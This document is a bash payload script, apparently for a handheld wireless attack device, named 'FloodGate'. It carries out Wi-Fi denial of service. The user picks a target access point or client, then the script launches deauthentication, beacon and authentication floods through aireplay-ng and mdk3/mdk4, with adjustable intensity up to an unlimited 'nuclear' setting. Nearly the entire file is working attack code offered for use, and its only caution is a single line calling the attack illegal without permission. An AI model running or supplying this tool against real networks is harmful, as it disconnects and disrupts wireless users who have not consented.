#!/bin/bash
# Title: FloodGate
# Author: NullSec
# Description: Multi-vector DoS combining deauth, beacon, and auth flood
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/floodgate"
mkdir -p "$LOOT_DIR"

PROMPT "FLOODGATE

Multi-vector wireless
denial of service.

Attack vectors:
- Deauthentication flood
- Beacon frame flood
- Authentication flood
- Combined assault

WARNING: Highly disruptive
Illegal without permission.

Press OK to configure."

# Check tools
MISSING=""
command -v aireplay-ng >/dev/null 2>&1 || MISSING="${MISSING}aireplay-ng "
command -v mdk3 >/dev/null 2>&1 && HAS_MDK3=1 || HAS_MDK3=0
command -v mdk4 >/dev/null 2>&1 && HAS_MDK4=1 || HAS_MDK4=0

if [ -z "$(command -v aireplay-ng 2>/dev/null)" ] && [ $HAS_MDK3 -eq 0 ] && [ $HAS_MDK4 -eq 0 ]; then
    ERROR_DIALOG "No flood tools found!

Install:
opkg install aircrack-ng
opkg install mdk3 or mdk4"
    exit 1
fi

# Find monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "No monitor interface!

airmon-ng start wlan1"; exit 1; }

PROMPT "ATTACK VECTOR:

1. Deauth flood
2. Beacon flood
3. Auth flood
4. Combined (all three)
5. Targeted deauth

Monitor: $MONITOR_IF

Select vector next."

ATTACK_VECTOR=$(NUMBER_PICKER "Vector (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ATTACK_VECTOR=1 ;; esac

# Intensity setting
PROMPT "INTENSITY:

1. Low (stealthy)
2. Medium (balanced)
3. High (aggressive)
4. Maximum (nuclear)

Higher = more disruption
but more detectable.

Select intensity next."

INTENSITY=$(NUMBER_PICKER "Intensity (1-4):" 2)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) INTENSITY=2 ;; esac

case $INTENSITY in
    1) DELAY=100; PACKETS=50;   LABEL="Low" ;;
    2) DELAY=50;  PACKETS=200;  LABEL="Medium" ;;
    3) DELAY=10;  PACKETS=500;  LABEL="High" ;;
    4) DELAY=0;   PACKETS=0;    LABEL="Maximum" ;;
esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

# Target selection for targeted attacks
TARGET_BSSID=""
TARGET_CHANNEL=""
if [ "$ATTACK_VECTOR" = "1" ] || [ "$ATTACK_VECTOR" = "4" ] || [ "$ATTACK_VECTOR" = "5" ]; then
    SPINNER_START "Scanning for targets..."
    SCAN_FILE="/tmp/flood_scan_$$.csv"
    timeout 10 airodump-ng "$MONITOR_IF" --output-format csv -w "/tmp/flood_scan_$$" 2>/dev/null &
    sleep 10
    kill %1 2>/dev/null
    wait 2>/dev/null

    TARGETS=$(grep -E "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "${SCAN_FILE}-01.csv" 2>/dev/null | head -8)
    SPINNER_STOP

    PROMPT "TARGETS FOUND:

$(echo "$TARGETS" | awk -F, '{print NR". "$1" ch"$4" "$14}' | head -8)

Enter target BSSID."

    TARGET_BSSID=$(TEXT_PICKER "BSSID:" "$(echo "$TARGETS" | head -1 | awk -F, '{print $1}' | xargs)")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED)
        TARGET_BSSID="FF:FF:FF:FF:FF:FF"
        ;;
    esac

    TARGET_CHANNEL=$(echo "$TARGETS" | grep "$TARGET_BSSID" | awk -F, '{print $4}' | xargs)
    TARGET_CHANNEL=${TARGET_CHANNEL:-6}

    # Set channel
    iwconfig "$MONITOR_IF" channel "$TARGET_CHANNEL" 2>/dev/null
    rm -f "${SCAN_FILE}"*
fi

resp=$(CONFIRMATION_DIALOG "LAUNCH FLOODGATE?

Vector: $ATTACK_VECTOR
Intensity: $LABEL
Duration: ${DURATION}s
Target: ${TARGET_BSSID:-broadcast}
Channel: ${TARGET_CHANNEL:-all}

THIS IS DESTRUCTIVE!

Confirm?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
FLOOD_LOG="$LOOT_DIR/flood_$TIMESTAMP.log"

LOG "FloodGate: Vector $ATTACK_VECTOR, Intensity $LABEL"
SPINNER_START "FloodGate active..."

PIDS=""

case $ATTACK_VECTOR in
    1) # Deauth flood
        if [ "$PACKETS" -eq 0 ]; then
            timeout "$DURATION" aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MONITOR_IF" > "$FLOOD_LOG" 2>&1 &
        else
            timeout "$DURATION" aireplay-ng --deauth "$PACKETS" -a "$TARGET_BSSID" "$MONITOR_IF" > "$FLOOD_LOG" 2>&1 &
        fi
        PIDS="$PIDS $!"
        ;;

    2) # Beacon flood
        if [ $HAS_MDK4 -eq 1 ]; then
            timeout "$DURATION" mdk4 "$MONITOR_IF" b -s "$((1000 / (DELAY + 1)))" > "$FLOOD_LOG" 2>&1 &
        elif [ $HAS_MDK3 -eq 1 ]; then
            timeout "$DURATION" mdk3 "$MONITOR_IF" b > "$FLOOD_LOG" 2>&1 &
        else
            # Fallback: rapid beacon injection via aireplay
            echo "Beacon flood requires mdk3/mdk4" > "$FLOOD_LOG"
        fi
        PIDS="$PIDS $!"
        ;;

    3) # Auth flood
        if [ $HAS_MDK4 -eq 1 ]; then
            timeout "$DURATION" mdk4 "$MONITOR_IF" a -a "$TARGET_BSSID" > "$FLOOD_LOG" 2>&1 &
        elif [ $HAS_MDK3 -eq 1 ]; then
            timeout "$DURATION" mdk3 "$MONITOR_IF" a -a "$TARGET_BSSID" > "$FLOOD_LOG" 2>&1 &
        else
            echo "Auth flood requires mdk3/mdk4" > "$FLOOD_LOG"
        fi
        PIDS="$PIDS $!"
        ;;

    4) # Combined assault
        # Deauth
        timeout "$DURATION" aireplay-ng --deauth 0 -a "${TARGET_BSSID:-FF:FF:FF:FF:FF:FF}" "$MONITOR_IF" >> "$FLOOD_LOG" 2>&1 &
        PIDS="$PIDS $!"

        # Beacon flood
        if [ $HAS_MDK4 -eq 1 ]; then
            timeout "$DURATION" mdk4 "$MONITOR_IF" b >> "$FLOOD_LOG" 2>&1 &
            PIDS="$PIDS $!"
        elif [ $HAS_MDK3 -eq 1 ]; then
            timeout "$DURATION" mdk3 "$MONITOR_IF" b >> "$FLOOD_LOG" 2>&1 &
            PIDS="$PIDS $!"
        fi

        # Auth flood
        if [ $HAS_MDK4 -eq 1 ]; then
            timeout "$DURATION" mdk4 "$MONITOR_IF" a -a "${TARGET_BSSID:-FF:FF:FF:FF:FF:FF}" >> "$FLOOD_LOG" 2>&1 &
            PIDS="$PIDS $!"
        elif [ $HAS_MDK3 -eq 1 ]; then
            timeout "$DURATION" mdk3 "$MONITOR_IF" a -a "${TARGET_BSSID:-FF:FF:FF:FF:FF:FF}" >> "$FLOOD_LOG" 2>&1 &
            PIDS="$PIDS $!"
        fi
        ;;

    5) # Targeted deauth (specific client)
        CLIENT_MAC=$(TEXT_PICKER "Client MAC:" "FF:FF:FF:FF:FF:FF")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CLIENT_MAC="FF:FF:FF:FF:FF:FF" ;; esac

        timeout "$DURATION" aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$CLIENT_MAC" "$MONITOR_IF" > "$FLOOD_LOG" 2>&1 &
        PIDS="$PIDS $!"
        ;;
esac

SPINNER_STOP

PROMPT "FLOODGATE ACTIVE!

Vector: $ATTACK_VECTOR
Intensity: $LABEL
Duration: ${DURATION}s

Attack in progress...

Press OK to wait for
completion."

# Wait for all attack processes
for pid in $PIDS; do
    wait "$pid" 2>/dev/null
done

LOG_SIZE=$(wc -l < "$FLOOD_LOG" 2>/dev/null | tr -d ' ')

PROMPT "FLOODGATE COMPLETE

Duration: ${DURATION}s
Log lines: $LOG_SIZE

Saved: $FLOOD_LOG

Press OK to exit."
